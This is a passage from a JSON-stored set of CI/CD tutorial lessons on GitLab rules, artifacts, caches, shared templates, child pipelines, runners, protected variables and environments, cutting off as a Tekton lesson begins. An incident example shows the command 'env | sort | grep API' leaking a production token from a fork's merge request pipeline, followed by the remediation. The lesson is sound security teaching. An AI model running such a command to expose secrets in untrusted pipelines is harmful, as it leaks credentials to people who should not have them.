class=\"hljs-string\">$CI_DEFAULT_BRANCH\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">if:\u003c/span> \u003cspan class=\"hljs-string\">$CI_COMMIT_TAG\u003c/span>\n\n\u003cspan class=\"hljs-attr\">docs:\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span> \u003cspan class=\"hljs-string\">make\u003c/span> \u003cspan class=\"hljs-string\">docs\u003c/span>\n  \u003cspan class=\"hljs-attr\">rules:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">changes:\u003c/span> [\u003cspan class=\"hljs-string\">docs/**/*\u003c/span>]\n\n\u003cspan class=\"hljs-attr\">release:\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span> \u003cspan class=\"hljs-string\">./release.sh\u003c/span>\n  \u003cspan class=\"hljs-attr\">rules:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">if:\u003c/span> \u003cspan class=\"hljs-string\">$CI_COMMIT_TAG\u003c/span>\n      \u003cspan class=\"hljs-attr\">when:\u003c/span> \u003cspan class=\"hljs-string\">on_success\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">when:\u003c/span> \u003cspan class=\"hljs-string\">never\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>\u003ccode>rules\u003c/code> are checked in order and the first match decides. A job with no matching rule is not added. \u003ccode>workflow:rules\u003c/code> controls whether the whole pipeline is created, which is how you stop the duplicate branch and merge request pipelines. Prefer \u003ccode>rules\u003c/code> over the older \u003ccode>only\u003c/code> and \u003ccode>except\u003c/code>, and do not combine them in one job.\u003c/p>\n\u003ch2 id=\"artifacts-and-caches\">Artifacts and caches\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"build:\n  script: [make build]\n  artifacts:\n    paths: [dist/]\n    expire_in: 1 week\n    reports:\n      junit: report.xml\n\ntest:\n  cache:\n    key:\n      files: [package-lock.json]\n    paths: [.npm/]\n    policy: pull-push\n  script: [npm ci --cache .npm, npm test]\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">build:\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span> [\u003cspan class=\"hljs-string\">make\u003c/span> \u003cspan class=\"hljs-string\">build\u003c/span>]\n  \u003cspan class=\"hljs-attr\">artifacts:\u003c/span>\n    \u003cspan class=\"hljs-attr\">paths:\u003c/span> [\u003cspan class=\"hljs-string\">dist/\u003c/span>]\n    \u003cspan class=\"hljs-attr\">expire_in:\u003c/span> \u003cspan class=\"hljs-number\">1\u003c/span> \u003cspan class=\"hljs-string\">week\u003c/span>\n    \u003cspan class=\"hljs-attr\">reports:\u003c/span>\n      \u003cspan class=\"hljs-attr\">junit:\u003c/span> \u003cspan class=\"hljs-string\">report.xml\u003c/span>\n\n\u003cspan class=\"hljs-attr\">test:\u003c/span>\n  \u003cspan class=\"hljs-attr\">cache:\u003c/span>\n    \u003cspan class=\"hljs-attr\">key:\u003c/span>\n      \u003cspan class=\"hljs-attr\">files:\u003c/span> [\u003cspan class=\"hljs-string\">package-lock.json\u003c/span>]\n    \u003cspan class=\"hljs-attr\">paths:\u003c/span> [\u003cspan class=\"hljs-string\">.npm/\u003c/span>]\n    \u003cspan class=\"hljs-attr\">policy:\u003c/span> \u003cspan class=\"hljs-string\">pull-push\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span> [\u003cspan class=\"hljs-string\">npm\u003c/span> \u003cspan class=\"hljs-string\">ci\u003c/span> \u003cspan class=\"hljs-string\">--cache\u003c/span> \u003cspan class=\"hljs-string\">.npm\u003c/span>, \u003cspan class=\"hljs-string\">npm\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>]\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>\u003cstrong>Artifacts\u003c/strong> are uploaded to GitLab, passed to later jobs and downloadable, so use them for results you must rely on: binaries, reports and test output. \u003cstrong>Cache\u003c/strong> stores dependency files between pipelines on the runner side or in object storage, and it may be missing, so every job must work without it. Key the cache by the lockfile so it refreshes when dependencies change, and use \u003ccode>policy: pull\u003c/code> in jobs that only read it.\u003c/p>\n\u003ch2 id=\"pitfalls\">Pitfalls\u003c/h2>\n\u003cp>Do not put build outputs in the cache and expect them later. Set \u003ccode>expire_in\u003c/code> on artifacts so storage does not grow without bound. Never place secrets in artifacts, because anyone with access can download them.\u003c/p>\n\u003ch2 id=\"incident-two-pipelines-for-one-change\">Incident: Two pipelines for one change\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>Every merge request ran a branch pipeline and a merge request pipeline.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">Pipeline #901 for branch feature/login\u003c/span>\u003cspan class=\"ln out\">Pipeline #902 for merge request !44\u003c/span>\u003cspan class=\"ln out\">same commit, same jobs, double runner time\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Jobs had no rules, so GitLab created a pipeline for the branch push and another for the merge request. The team added workflow rules that run merge request pipelines and skip the branch pipeline when a merge request is open, which removed half of the load and the confusing duplicate statuses.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Mixing only and except with rules in one job\u003c/li>\n\u003cli>Relying on cache for build outputs\u003c/li>\n\u003cli>Artifacts without expiry\u003c/li>\n\u003cli>Cache keys that never change\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"rules","text":"Rules"},{"id":"artifacts-and-caches","text":"Artifacts and caches"},{"id":"pitfalls","text":"Pitfalls"},{"id":"incident-two-pipelines-for-one-change","text":"Incident: Two pipelines for one change"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Rules reference","u":"https://docs.gitlab.com/ee/ci/yaml/#rules"},{"t":"Caching in GitLab CI/CD","u":"https://docs.gitlab.com/ee/ci/caching/"}],"text":"Real pipelines do different things for merge requests, the default branch and tags. GitLab expresses that with rules, and it gives you two tools for keeping files, artifacts and caches, which look similar but have very different guarantees. What you will learn Writing rules with if, changes and exists Preventing duplicate pipelines with workflow rules When to use artifacts and when caches Cache keys, policies and expiry Rules workflow: rules: - if: $CI_PIPELINE_SOURCE == \"merge_request_event\" - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS when: never - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH - if: $CI_COMMIT_TAG docs: script: make docs rules: - changes: [ docs/**/* ] release: script: ./release.sh rules: - if: $CI_COMMIT_TAG when: on_success - when: never rules are checked in order and the first match decides. A job with no matching rule is not added. workflow:rules controls whether the whole pipeline is created, which is how you stop the duplicate branch and merge request pipelines. Prefer rules over the older only and except , and do not combine them in one job. Artifacts and caches build: script: [ make build ] artifacts: paths: [ dist/ ] expire_in: 1 week reports: junit: report.xml test: cache: key: files: [ package-lock.json ] paths: [ .npm/ ] policy: pull-push script: [ npm ci --cache .npm , npm test ] Artifacts are uploaded to GitLab, passed to later jobs and downloadable, so use them for results you must rely on: binaries, reports and test output. Cache stores dependency files between pipelines on the runner side or in object storage, and it may be missing, so every job must work without it. Key the cache by the lockfile so it refreshes when dependencies change, and use policy: pull in jobs that only read it. Pitfalls Do not put build outputs in the cache and expect them later. Set expire_in on artifacts so storage does not grow without bound. Never place secrets in artifacts, because anyone with access can download them. Incident: Two pipelines for one change Incident Every merge request ran a branch pipeline and a merge request pipeline. Pipeline #901 for branch feature/login Pipeline #902 for merge request !44 same commit, same jobs, double runner time Jobs had no rules, so GitLab created a pipeline for the branch push and another for the merge request. The team added workflow rules that run merge request pipelines and skip the branch pipeline when a merge request is open, which removed half of the load and the confusing duplicate statuses. Common mistakes Mixing only and except with rules in one job Relying on cache for build outputs Artifacts without expiry Cache keys that never change"},"cicd/gitlab-ci-includes-templates-and-dynamic-pipelines":{"html":"\u003cp>One file works for a small project, but a company with hundreds of repositories needs sharing. GitLab gives you includes, inheritance and downstream pipelines so common logic lives in one place and large repositories do not run everything every time.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Using include to share configuration\u003c/li>\n\u003cli>Reusing blocks with extends and hidden jobs\u003c/li>\n\u003cli>Parent and child pipelines for monorepos\u003c/li>\n\u003cli>Generating a child pipeline dynamically\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"include-and-extends\">Include and extends\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"include:\n  - project: platform/ci-templates\n    ref: v3.2.0\n    file: /templates/build.yml\n  - local: /ci/lint.yml\n\n.deploy-base:\n  image: registry.example.com/tools/deploy:1.9\n  before_script:\n    - ./login.sh\n\ndeploy-staging:\n  extends: .deploy-base\n  script: ./deploy.sh staging\n\ndeploy-prod:\n  extends: .deploy-base\n  script: ./deploy.sh production\n  when: manual\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">include:\u003c/span>\n  \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">project:\u003c/span> \u003cspan class=\"hljs-string\">platform/ci-templates\u003c/span>\n    \u003cspan class=\"hljs-attr\">ref:\u003c/span> \u003cspan class=\"hljs-string\">v3.2.0\u003c/span>\n    \u003cspan class=\"hljs-attr\">file:\u003c/span> \u003cspan class=\"hljs-string\">/templates/build.yml\u003c/span>\n  \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">local:\u003c/span> \u003cspan class=\"hljs-string\">/ci/lint.yml\u003c/span>\n\n\u003cspan class=\"hljs-string\">.deploy-base:\u003c/span>\n  \u003cspan class=\"hljs-attr\">image:\u003c/span> \u003cspan class=\"hljs-string\">registry.example.com/tools/deploy:1.9\u003c/span>\n  \u003cspan class=\"hljs-attr\">before_script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">./login.sh\u003c/span>\n\n\u003cspan class=\"hljs-attr\">deploy-staging:\u003c/span>\n  \u003cspan class=\"hljs-attr\">extends:\u003c/span> \u003cspan class=\"hljs-string\">.deploy-base\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span> \u003cspan class=\"hljs-string\">./deploy.sh\u003c/span> \u003cspan class=\"hljs-string\">staging\u003c/span>\n\n\u003cspan class=\"hljs-attr\">deploy-prod:\u003c/span>\n  \u003cspan class=\"hljs-attr\">extends:\u003c/span> \u003cspan class=\"hljs-string\">.deploy-base\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span> \u003cspan class=\"hljs-string\">./deploy.sh\u003c/span> \u003cspan class=\"hljs-string\">production\u003c/span>\n  \u003cspan class=\"hljs-attr\">when:\u003c/span> \u003cspan class=\"hljs-string\">manual\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>\u003ccode>include\u003c/code> pulls in files from the same project, another project, a remote URL or GitLab&#39;s own templates. Always set \u003ccode>ref\u003c/code> to a tag so a template change cannot break every project unexpectedly. A job starting with a dot is \u003cstrong>hidden\u003c/strong>: it does not run, but other jobs can inherit from it with \u003ccode>extends\u003c/code>, and the child&#39;s keys override the parent&#39;s.\u003c/p>\n\u003ch2 id=\"parent-and-child-pipelines\">Parent and child pipelines\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"trigger-api:\n  trigger:\n    include: services/api/.gitlab-ci.yml\n    strategy: depend\n  rules:\n    - changes: [services/api/**/*]\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">trigger-api:\u003c/span>\n  \u003cspan class=\"hljs-attr\">trigger:\u003c/span>\n    \u003cspan class=\"hljs-attr\">include:\u003c/span> \u003cspan class=\"hljs-string\">services/api/.gitlab-ci.yml\u003c/span>\n    \u003cspan class=\"hljs-attr\">strategy:\u003c/span> \u003cspan class=\"hljs-string\">depend\u003c/span>\n  \u003cspan class=\"hljs-attr\">rules:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">changes:\u003c/span> [\u003cspan class=\"hljs-string\">services/api/**/*\u003c/span>]\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A \u003cstrong>child pipeline\u003c/strong> is a separate pipeline started by a job in the parent. With \u003ccode>strategy: depend\u003c/code> the parent waits and takes the child&#39;s result. Combined with \u003ccode>changes\u003c/code>, only affected services run, which is the usual answer for monorepos.\u003c/p>\n\u003ch2 id=\"dynamic-child-pipelines\">Dynamic child pipelines\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"generate:\n  stage: build\n  script: ./make-pipeline.sh &gt; generated.yml\n  artifacts:\n    paths: [generated.yml]\n\nrun-generated:\n  stage: test\n  trigger:\n    include:\n      - artifact: generated.yml\n        job: generate\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">generate:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">build\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span> \u003cspan class=\"hljs-string\">./make-pipeline.sh\u003c/span> \u003cspan class=\"hljs-string\">&gt;\u003c/span> \u003cspan class=\"hljs-string\">generated.yml\u003c/span>\n  \u003cspan class=\"hljs-attr\">artifacts:\u003c/span>\n    \u003cspan class=\"hljs-attr\">paths:\u003c/span> [\u003cspan class=\"hljs-string\">generated.yml\u003c/span>]\n\n\u003cspan class=\"hljs-attr\">run-generated:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\n  \u003cspan class=\"hljs-attr\">trigger:\u003c/span>\n    \u003cspan class=\"hljs-attr\">include:\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">artifact:\u003c/span> \u003cspan class=\"hljs-string\">generated.yml\u003c/span>\n        \u003cspan class=\"hljs-attr\">job:\u003c/span> \u003cspan class=\"hljs-string\">generate\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A script writes a YAML file as an artifact, and the next job triggers it as a pipeline. Use this when the set of jobs depends on the change, such as one job per modified package. Keep generators simple and test the generated YAML, because an error appears only at run time.\u003c/p>\n\u003ch2 id=\"incident-the-template-that-broke-every-project\">Incident: The template that broke every project\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>An unpinned shared template change failed pipelines across the company.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">include: project platform/ci-templates, ref main\u003c/span>\u003cspan class=\"ln out\">error: jobs:build config contains unknown keys: cahce\u003c/span>\u003cspan class=\"ln out\">112 pipelines failed in 10 minutes\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A typo was merged to the shared template, and every project followed the main branch. The platform team pinned includes to version tags, added tests that lint the template against sample projects and published a release process, so changes roll out gradually.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Including shared templates from a moving branch\u003c/li>\n\u003cli>Deeply nested includes nobody can follow\u003c/li>\n\u003cli>Dynamic pipelines with no tests for the generator\u003c/li>\n\u003cli>Running all services on every change in a monorepo\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"include-and-extends","text":"Include and extends"},{"id":"parent-and-child-pipelines","text":"Parent and child pipelines"},{"id":"dynamic-child-pipelines","text":"Dynamic child pipelines"},{"id":"incident-the-template-that-broke-every-project","text":"Incident: The template that broke every project"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Use CI/CD configuration from other files","u":"https://docs.gitlab.com/ee/ci/yaml/includes.html"},{"t":"Downstream pipelines","u":"https://docs.gitlab.com/ee/ci/pipelines/downstream_pipelines.html"}],"text":"One file works for a small project, but a company with hundreds of repositories needs sharing. GitLab gives you includes, inheritance and downstream pipelines so common logic lives in one place and large repositories do not run everything every time. What you will learn Using include to share configuration Reusing blocks with extends and hidden jobs Parent and child pipelines for monorepos Generating a child pipeline dynamically Include and extends include: - project: platform/ci-templates ref: v3.2.0 file: /templates/build.yml - local: /ci/lint.yml .deploy-base: image: registry.example.com/tools/deploy:1.9 before_script: - ./login.sh deploy-staging: extends: .deploy-base script: ./deploy.sh staging deploy-prod: extends: .deploy-base script: ./deploy.sh production when: manual include pulls in files from the same project, another project, a remote URL or GitLab&#39;s own templates. Always set ref to a tag so a template change cannot break every project unexpectedly. A job starting with a dot is hidden : it does not run, but other jobs can inherit from it with extends , and the child&#39;s keys override the parent&#39;s. Parent and child pipelines trigger-api: trigger: include: services/api/.gitlab-ci.yml strategy: depend rules: - changes: [ services/api/**/* ] A child pipeline is a separate pipeline started by a job in the parent. With strategy: depend the parent waits and takes the child&#39;s result. Combined with changes , only affected services run, which is the usual answer for monorepos. Dynamic child pipelines generate: stage: build script: ./make-pipeline.sh > generated.yml artifacts: paths: [ generated.yml ] run-generated: stage: test trigger: include: - artifact: generated.yml job: generate A script writes a YAML file as an artifact, and the next job triggers it as a pipeline. Use this when the set of jobs depends on the change, such as one job per modified package. Keep generators simple and test the generated YAML, because an error appears only at run time. Incident: The template that broke every project Incident An unpinned shared template change failed pipelines across the company. include: project platform/ci-templates, ref main error: jobs:build config contains unknown keys: cahce 112 pipelines failed in 10 minutes A typo was merged to the shared template, and every project followed the main branch. The platform team pinned includes to version tags, added tests that lint the template against sample projects and published a release process, so changes roll out gradually. Common mistakes Including shared templates from a moving branch Deeply nested includes nobody can follow Dynamic pipelines with no tests for the generator Running all services on every change in a monorepo"},"cicd/gitlab-runners-environments-and-security":{"html":"\u003cp>The pipeline file says what to do, but runners, variables and environments decide where it runs and what it can touch. This lesson covers how to pick runners, how to keep secrets limited to trusted code and how to put human gates in front of production.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Runner scopes, tags and executors\u003c/li>\n\u003cli>Protected and masked variables\u003c/li>\n\u003cli>Environments, approvals and protected branches\u003c/li>\n\u003cli>Short-lived credentials with ID tokens\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"runners\">Runners\u003c/h2>\n\u003cp>A \u003cstrong>runner\u003c/strong> polls GitLab for jobs. It can be shared across an instance, assigned to a group or dedicated to one project. The \u003cstrong>executor\u003c/strong> decides how a job runs: \u003ccode>docker\u003c/code> starts a container per job, \u003ccode>kubernetes\u003c/code> starts a pod, and \u003ccode>shell\u003c/code> runs directly on the host, which is the least isolated. Use tags to route work:\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"gpu-test:\n  tags: [gpu, linux]\n  script: ./run-gpu-tests.sh\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">gpu-test:\u003c/span>\n  \u003cspan class=\"hljs-attr\">tags:\u003c/span> [\u003cspan class=\"hljs-string\">gpu\u003c/span>, \u003cspan class=\"hljs-string\">linux\u003c/span>]\n  \u003cspan class=\"hljs-attr\">script:\u003c/span> \u003cspan class=\"hljs-string\">./run-gpu-tests.sh\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cdiv class=\"code\" data-lang=\"toml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# /etc/gitlab-runner/config.toml (excerpt)\nconcurrent = 4\n[[runners]]\n  name = &quot;docker-builder&quot;\n  executor = &quot;docker&quot;\n  [runners.docker]\n    image = &quot;alpine:3.20&quot;\n    privileged = false\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># /etc/gitlab-runner/config.toml (excerpt)\u003c/span>\n\u003cspan class=\"hljs-attr\">concurrent\u003c/span> = \u003cspan class=\"hljs-number\">4\u003c/span>\n\u003cspan class=\"hljs-section\">[[runners]]\u003c/span>\n  \u003cspan class=\"hljs-attr\">name\u003c/span> = \u003cspan class=\"hljs-string\">&quot;docker-builder&quot;\u003c/span>\n  \u003cspan class=\"hljs-attr\">executor\u003c/span> = \u003cspan class=\"hljs-string\">&quot;docker&quot;\u003c/span>\n  \u003cspan class=\"hljs-section\">[runners.docker]\u003c/span>\n    \u003cspan class=\"hljs-attr\">image\u003c/span> = \u003cspan class=\"hljs-string\">&quot;alpine:3.20&quot;\u003c/span>\n    \u003cspan class=\"hljs-attr\">privileged\u003c/span> = \u003cspan class=\"hljs-literal\">false\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Avoid \u003ccode>privileged = true\u003c/code> unless you must build images in Docker, and prefer rootless builders. Never share one runner between code of different trust levels.\u003c/p>\n\u003ch2 id=\"variables\">Variables\u003c/h2>\n\u003cp>Set secrets under project or group CI/CD variables, not in the YAML. Mark them \u003cstrong>masked\u003c/strong> so values are hidden in logs and \u003cstrong>protected\u003c/strong> so only protected branches and tags receive them. Scope a variable to an environment such as \u003ccode>production\u003c/code> so test jobs never see it.\u003c/p>\n\u003ch2 id=\"environments-and-approvals\">Environments and approvals\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"deploy-prod:\n  stage: deploy\n  script: ./deploy.sh\n  environment:\n    name: production\n    url: https://shop.example.com\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n      when: manual\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">deploy-prod:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">deploy\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span> \u003cspan class=\"hljs-string\">./deploy.sh\u003c/span>\n  \u003cspan class=\"hljs-attr\">environment:\u003c/span>\n    \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">production\u003c/span>\n    \u003cspan class=\"hljs-attr\">url:\u003c/span> \u003cspan class=\"hljs-string\">https://shop.example.com\u003c/span>\n  \u003cspan class=\"hljs-attr\">rules:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">if:\u003c/span> \u003cspan class=\"hljs-string\">$CI_COMMIT_BRANCH\u003c/span> \u003cspan class=\"hljs-string\">==\u003c/span> \u003cspan class=\"hljs-string\">$CI_DEFAULT_BRANCH\u003c/span>\n      \u003cspan class=\"hljs-attr\">when:\u003c/span> \u003cspan class=\"hljs-string\">manual\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>An \u003cstrong>environment\u003c/strong> records deployments, links to the running site and can require approval before a job starts. Combine it with protected branches so only reviewed code can reach the production job.\u003c/p>\n\u003ch2 id=\"identity-without-stored-keys\">Identity without stored keys\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"deploy:\n  id_tokens:\n    CLOUD_TOKEN:\n      aud: https://cloud.example.com\n  script: ./exchange-token-and-deploy.sh\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">deploy:\u003c/span>\n  \u003cspan class=\"hljs-attr\">id_tokens:\u003c/span>\n    \u003cspan class=\"hljs-attr\">CLOUD_TOKEN:\u003c/span>\n      \u003cspan class=\"hljs-attr\">aud:\u003c/span> \u003cspan class=\"hljs-string\">https://cloud.example.com\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span> \u003cspan class=\"hljs-string\">./exchange-token-and-deploy.sh\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>An \u003cstrong>ID token\u003c/strong> is a short-lived signed token that the job can exchange with a cloud provider that trusts your GitLab, replacing stored keys.\u003c/p>\n\u003ch2 id=\"incident-the-variable-in-the-merge-request-log\">Incident: The variable in the merge request log\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A fork&#39;s merge request pipeline printed a production token.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"env | sort | grep API\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">env\u003c/span> | \u003cspan class=\"hljs-built_in\">sort\u003c/span> | grep API\u003c/span>\u003cspan class=\"ln out\">API_TOKEN=prod-4f9a...\u003c/span>\u003cspan class=\"ln out\">pipeline source: merge_request_event\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The token was an ordinary variable available to every pipeline. A contributor&#39;s merge request added a debug line and revealed it. The team rotated the token, marked it protected and masked, scoped it to the production environment and required approval for pipelines from forks.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Secrets that are not protected or masked\u003c/li>\n\u003cli>Shell executors shared by unrelated projects\u003c/li>\n\u003cli>Privileged Docker runners for everything\u003c/li>\n\u003cli>Production jobs that any branch can start\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"runners","text":"Runners"},{"id":"variables","text":"Variables"},{"id":"environments-and-approvals","text":"Environments and approvals"},{"id":"identity-without-stored-keys","text":"Identity without stored keys"},{"id":"incident-the-variable-in-the-merge-request-log","text":"Incident: The variable in the merge request log"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"GitLab Runner","u":"https://docs.gitlab.com/runner/"},{"t":"Environments","u":"https://docs.gitlab.com/ee/ci/environments/"}],"text":"The pipeline file says what to do, but runners, variables and environments decide where it runs and what it can touch. This lesson covers how to pick runners, how to keep secrets limited to trusted code and how to put human gates in front of production. What you will learn Runner scopes, tags and executors Protected and masked variables Environments, approvals and protected branches Short-lived credentials with ID tokens Runners A runner polls GitLab for jobs. It can be shared across an instance, assigned to a group or dedicated to one project. The executor decides how a job runs: docker starts a container per job, kubernetes starts a pod, and shell runs directly on the host, which is the least isolated. Use tags to route work: gpu-test: tags: [ gpu , linux ] script: ./run-gpu-tests.sh # /etc/gitlab-runner/config.toml (excerpt) concurrent = 4 [[runners]] name = \"docker-builder\" executor = \"docker\" [runners.docker] image = \"alpine:3.20\" privileged = false Avoid privileged = true unless you must build images in Docker, and prefer rootless builders. Never share one runner between code of different trust levels. Variables Set secrets under project or group CI/CD variables, not in the YAML. Mark them masked so values are hidden in logs and protected so only protected branches and tags receive them. Scope a variable to an environment such as production so test jobs never see it. Environments and approvals deploy-prod: stage: deploy script: ./deploy.sh environment: name: production url: https://shop.example.com rules: - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH when: manual An environment records deployments, links to the running site and can require approval before a job starts. Combine it with protected branches so only reviewed code can reach the production job. Identity without stored keys deploy: id_tokens: CLOUD_TOKEN: aud: https://cloud.example.com script: ./exchange-token-and-deploy.sh An ID token is a short-lived signed token that the job can exchange with a cloud provider that trusts your GitLab, replacing stored keys. Incident: The variable in the merge request log Incident A fork&#39;s merge request pipeline printed a production token. $ env | sort | grep API API_TOKEN=prod-4f9a... pipeline source: merge_request_event The token was an ordinary variable available to every pipeline. A contributor&#39;s merge request added a debug line and revealed it. The team rotated the token, marked it protected and masked, scoped it to the production environment and required approval for pipelines from forks. Common mistakes Secrets that are not protected or masked Shell executors shared by unrelated projects Privileged Docker runners for everything Production jobs that any branch can start"},"cicd/tekton-tasks-pipelines-and-workspaces":{"html":"\u003cp>Tekton is a Kubernetes-native CI and delivery framework. Everything is a custom resource, so pipelines are applied with kubectl, scheduled as pods and observable with the same tools as any other workload.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Writing a Task with steps and params\u003c/li>\n\u003cli>Linking tasks into a Pipeline\u003c/li>\n\u003cli>Sharing data with workspaces and results\u003c/li>\n\u003cli>Running with TaskRun and PipelineRun\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"task\">Task\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"apiVersion: tekton.dev/v1\nkind: Task\nmetadata:\n  name: build-image\nspec:\n  params:\n    - name: image\n      type: string\n  workspaces:\n    - name: source\n  results:\n    - name: digest\n  steps:\n    - name: build\n      image: gcr.io/kaniko-project/executor:latest\n      args:\n        - 